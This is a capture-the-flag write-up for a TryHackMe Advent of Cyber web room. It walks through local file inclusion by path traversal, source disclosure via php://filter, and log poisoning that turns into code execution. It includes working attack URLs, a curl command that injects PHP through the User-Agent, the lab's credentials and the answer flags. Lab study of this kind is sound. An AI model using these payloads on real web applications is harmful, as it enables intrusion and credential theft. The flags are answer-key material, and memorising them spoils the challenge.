# `[Web Exploitation]` Patch Management is Hard

## Story
>During a routine security audit before the Incident, McSkidy discovered some recovery passwords on an old server. She created a ticket to decommission this server to reduce this security vulnerability. The Elf assigned to fix this vulnerability kept pushing off the task, and this never got done. Luckily, some of those recovery keys can be used to save some systems.
>
>Unfortunately, the only way to access the server is through an old web application. See if you can pull out those recovery keys to help McSkidy with her pursuit to save Christmas.

Deploy the attached VM and look around. What is the entry point for our web application? `***`

When I opened the webpage, I could see the entry point in the URL: https://10-10-140-173.p.thmlabs.com./index.php?**_err_**=error.txt

<details>
  <summary>Answer:</summary>

```
err
```
</details>
### Use the entry point to perform LFI to read the /etc/flag file. What is the flag? `***{********************************}`

Using this I was then able to change the url to show what I wanted it to:

`https://10-10-140-173.p.thmlabs.com/index.php?err=./../../../../../etc/flag`

<details>
  <summary>Answer:</summary>

```
THM{d29e08941cf7fe41df55f1a7da6c4c06}
```
</details>

### Use the PHP filter technique to read the source code of the index.php. What is the `$flag` variable's value? `***{********************************}`

Using the same method as above eccept also using PHP filters, I navigated to the following address:
`https://10-10-140-173.p.thmlabs.com./index.php?err=php://filter/convert.base64-encode/resource=index.php`

This spat out a bunch of base64 encoded text, which I then used CyberChef to convert from. The flag was easily viewable at the top.

<details>
  <summary>Answer:</summary>

```
THM{791d43d46018a0d89361dbf60d5d9eb8}
```
</details>

>McSkidy forgot his login credential. Can you help him to login in order to recover one of the server's passwords?

> Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. 
### What are the username and password? `*******:************`

Same as above really, just changed the location:

`https://10-10-140-173.p.thmlabs.com./index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php`

This gave me the info.

<details>
  <summary>Answer:</summary>

```
McSkidy:A0C315Aw3s0m
```
</details>

> Use the credentials to login into the web application. Help McSkidy to recover the server's password. 

### What is the password of the flag.thm.aoc server? `***{********************************}`

Logged in using those credentials, then clicked on Password Recovery. Passwords were listed in plain text.

<details>
  <summary>Answer:</summary>

```
THM{552f313b52e3c3dbf5257d8c6db7f6f1}
```
</details>

> The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. 

### What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log. `************************************************`

Using their instructions, I was able to use `curl` in a terminal:
```
curl -A "<?php phpinfo();?>" http://10-10-140-173.p.thmlabs.com/login.php
```

Then using the first stage of the LFI, I was able to execute the php payload sent in the User-Agent `https://10-10-140-173.p.thmlabs.com/index.php?err=./includes/logs/app_access.log`

The hostname was in the system category of the table.

<details>
  <summary>Answer:</summary>

```
lfi-aoc-awesome-59aedca683fff9261263bb084880c965
```
</details>